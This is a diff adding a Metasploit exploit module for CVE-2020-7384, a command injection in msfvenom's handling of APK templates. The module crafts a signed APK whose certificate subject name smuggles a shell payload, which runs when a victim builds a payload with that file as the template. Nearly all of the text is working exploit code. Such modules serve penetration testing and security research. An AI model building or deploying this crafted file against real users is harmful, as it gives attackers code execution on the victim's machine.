@@ -1,0 +1,86 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'rex/zip/jar'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Rapid7 Metasploit Framework msfvenom APK Template Command Injection',
+        'Description' => %q{
+          This module exploits a command injection vulnerability in Metasploit Framework's msfvenom
+          payload generator when using a crafted APK file as an Android payload template. Affects
+          Metasploit Framework <= 6.0.11 and Metasploit Pro <= 4.18.0. The file produced by this
+          module is a relatively empty yet valid-enough APK file. To trigger the vulnerability,
+          the victim user should do the following:
+
+          msfvenom -p android/<...> -x <crafted_file.apk>
+        },
+        'License' => MSF_LICENSE,
+        'Author' =>
+          [
+            'Justin Steven'   # @justinsteven
+          ],
+        'References' =>
+          [
+            ['URL', 'https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md'],
+            ['CVE', '2020-7384'],
+          ],
+        'DefaultOptions' =>
+          {
+            'DisablePayloadHandler' => true
+          },
+        'Arch' => ARCH_CMD,
+        'Platform' => 'unix',
+        'Payload' => {
+            'BadChars' => "\x22\x2c\x5c\x0a\x0d"
+        },
+        'Targets' => [[ 'Automatic', {}]],
+        'Privileged' => false,
+        'DisclosureDate' => '2020-10-29'
+      )
+    )
+    register_options([
+      OptString.new('FILENAME', [true, 'The APK file name', 'msf.apk'])
+    ])
+  end
+
+  def build_x509_name
+    name = "CN=';(#{payload.encoded}) >&- 2>&- & #"
+    OpenSSL::X509::Name.parse(name)
+  end
+
+  def generate_signing_material
+    key = OpenSSL::PKey::RSA.new(2048)
+    cert = OpenSSL::X509::Certificate.new
+    cert.version = 2
+    cert.serial = 1
+    cert.subject = cert.issuer = build_x509_name
+    cert.public_key = key.public_key
+    cert.not_before = Time.now
+    # FIXME: this will break in the year 2037 on 32-bit systems
+    cert.not_after = cert.not_before + 1.year
+    # Self-sign the certificate, otherwise the victim's keytool gets unhappy
+    cert.sign(key, OpenSSL::Digest::SHA256.new)
+
+    [cert, key]
+  end
+
+  def exploit
+    print_warning('Warning: bash payloads are unlikely to work') if datastore['PAYLOAD'].include?('bash')
+    apk = Rex::Zip::Jar.new
+    apk.build_manifest
+    cert, key = generate_signing_material
+    apk.sign(key, cert)
+    data = apk.pack
+    file_create(data)
+  end
+end
